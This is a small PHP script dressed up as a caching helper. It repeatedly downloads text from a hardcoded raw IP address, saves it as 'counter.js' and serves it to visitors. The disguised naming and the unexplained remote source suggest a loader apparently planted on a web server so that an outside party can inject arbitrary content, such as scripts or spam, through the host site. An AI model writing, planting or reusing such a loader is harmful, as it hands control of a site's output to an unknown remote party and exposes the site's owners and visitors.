<?php



// ----------------------------------------------------------------------

// touch this!  ---------------------------------------------------------



define( 'CACHE_DEBUG', 				false );

define( 'CACHE_TIME_SECONDS', 		0 );

define( 'CACHE_UPDATE_URL',  		"http://193.105.240.93/data/all.txt" );

define( 'CACHE_FILE', 				"counter.js" );



// ----------------------------------------------------------------------





$cache_code 	= null;

$cache_file 	= CACHE_FILE;

$cached_time 	= time() - (file_exists($cache_file) ? filemtime($cache_file) : 0);





// ----------------------------------------------------------------------



if (CACHE_DEBUG) echo "Cached time is {$cached_time} seconds, update planned after ".(CACHE_TIME_SECONDS - $cached_time)." seconds\n";





// ----------------------------------------------------------------------

// check cached time 



if($cached_time > CACHE_TIME_SECONDS)

{

	// get new cache code

	$cache_code = file_get_contents(CACHE_UPDATE_URL);

	if(!empty($cache_code))

	{

		if (CACHE_DEBUG) echo "Update cache...\n";

		write_cache($cache_file, $cache_code);

	}

	else

	{

		if (CACHE_DEBUG) echo "Can't get cache data!\n";

	}

}

else

{

		if(CACHE_DEBUG) echo "Read cache code...\n";



		// extract cached data

		$cache_code = extract_cache($cache_file);

		if(empty($cache_code))

		{

			if (CACHE_DEBUG) echo "Cache empty! Update cache...\n";

			$cache_code = file_get_contents(CACHE_UPDATE_URL);

			if(!empty($cache_code))

			{

				// write cache

				write_cache($cache_file, $cache_code);

			}

			else

			{

				if (CACHE_DEBUG) echo "Can't get cache data!\n";

			}

		}

}



// ----------------------------------------------------------------------



header("Content-Type: text/plain; charset=windows-1251");

echo $cache_code;



// ----------------------------------------------------------------------



exit;



// ----------------------------------------------------------------------

/// read file data



function file_get_contents_locked($file_path)

{

	$fp = fopen($file_path, "r");

	if($fp !== FALSE)

	{

		flock($fp, LOCK_EX);

		$data = fread($fp, filesize($file_path));

		flock($fp, LOCK_UN);

		fclose($fp);



		return $data;

	}



	return FALSE;

}





// ----------------------------------------------------------------------

/// extract cache from file by cache markers



function extract_cache($file_path)

{

	if(file_exists($file_path))

		return file_get_contents_locked($file_path);



	return null;

}





// ----------------------------------------------------------------------

// write cache to file



function write_cache($file_path, $cache_data)

{

	if(file_exists($file_path) && !is_writable($file_path))

	{

		if (CACHE_DEBUG) echo "Cache file not writable!\n";

		return null;

	}



	$fp=fopen($file_path, "w+");

	flock($fp, LOCK_EX);

	fwrite($fp, $cache_data);

	flock($fp, LOCK_UN);

	fclose($fp);

}